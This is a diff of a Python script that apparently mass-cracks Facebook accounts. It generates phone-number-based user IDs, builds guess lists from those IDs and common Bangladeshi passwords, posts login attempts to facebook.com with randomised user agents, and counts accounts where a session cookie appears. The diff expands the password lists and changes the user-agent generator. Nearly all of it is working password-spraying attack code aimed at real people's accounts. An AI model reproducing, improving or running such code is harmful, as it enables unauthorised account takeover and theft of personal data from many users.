@@ -491,8 +491,8 @@ def ___bd1___():
         print(f'{xd} TOTAL UID {xdxx}{G} '+tl);print(f'{xd} SIM CODE  {xdxx}{G} '+code);print(f'{xd} FIRST ON{G}|{W}OFF AIRPLANE MODE');linex()
         for love in user:
             ids = code+love
-            if pasxd in ['1','01']:passlist = [ids,love,ids[:8],ids[:7],code+code,love[1:],ids[:6],love[2:]]
-            elif pasxd in ['2','02']:passlist = [love[2:],love,code+love,code+love[:3],'bangladesh','free fire','i love you','708090','203040','506070','ayesha','Bangladesh','jannat']
+            if pasxd in ['1','01']:passlist = [ids,love,ids[:8],ids[:7],code+code,love[1:],ids[:6],love[2:],'bangladesh','free fire','i love you','708090','203040','506070','102030','113355','121234,@@@###','018@@','first12','890890','778899','nusrat','mabab','jannat']
+            elif pasxd in ['2','02']:passlist = [love[2:],love,code+love,code+love[:3],'bangladesh','free fire','i love you','708090','203040','506070','102030','113355','121234,@@@###','018@@','first12','890890','778899','nusrat','mabab','jannat']
             ___x___.submit(___HOST___,ids,passlist,tl,ck)
     print('');linex();print(f'{xd} TOTAL OK {xdxx}{G} {str(len(oks))}');print(f'{xd} TOTAL CP {xdxx}{G} {str(len(cps))}');linex();exit()
 #-----------------------❲ RANDOM BD API ❳-----------------------#
@@ -511,8 +511,8 @@ def ___bd2___():
         print(f'{xd} TOTAL UID {xdxx}{G} '+tl);print(f'{xd} SIM CODE  {xdxx}{G} '+code);print(f'{xd} FIRST ON{G}|{W}OFF AIRPLANE MODE');linex()
         for love in user:
             ids = code+love
-            if pasxd in ['1','01']:pwx = [ids,love,ids[:8],ids[:7],code+code,love[1:],ids[:6],love[2:]]
-            elif pasxd in ['2','02']:pwx = [love[2:],love,code+love,code+love[:3],'bangladesh','free fire','i love you','708090','203040','506070','ayesha','Bangladesh','jannat']
+            if pasxd in ['1','01']:pwx = [ids,love,ids[:8],ids[:7],code+code,love[1:],ids[:6],love[2:],'bangladesh','free fire','i love you','708090','203040','506070','102030','113355','121234,@@@###','018@@','first12','890890','778899','nusrat','mabab','jannat']
+            elif pasxd in ['2','02']:pwx = [love[2:],love,code+love,code+love[:3],'bangladesh','free fire','i love you','708090','203040','506070','102030','113355','121234,@@@###','018@@','first12','890890','778899','nusrat','mabab','jannat']
             __bal__.submit(___API___,ids,pwx,tl)
     print('');linex();print(f'{xd} TOTAL OK {xdxx}{G} {str(len(oks))}');print(f'{xd} TOTAL CP {xdxx}{G} {str(len(cps))}');linex();exit()
 #-----------------------❲ RANDOM INDIA ❳-----------------------#
@@ -603,7 +603,7 @@ def ___HOST___(ids,passlist,tl,ck):
         for pas in passlist:
             free_fb = session.get('https://free.facebook.com').text
             info={'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1), 'email': ids, 'login_source': 'comet_headerless_login', 'next': '', 'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(free_fb)).group(1),pas),}
-            update={'User-Agent': ___sex___(), 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://www.facebook.com/', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://www.facebook.com', 'Alt-Used': 'www.facebook.com', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}
+            update={'User-Agent': generate_random_user_agent(), 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://www.facebook.com/', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://www.facebook.com', 'Alt-Used': 'www.facebook.com', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}
             session.post(url=f"https://www.facebook.com/login/",data=info,headers=update).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
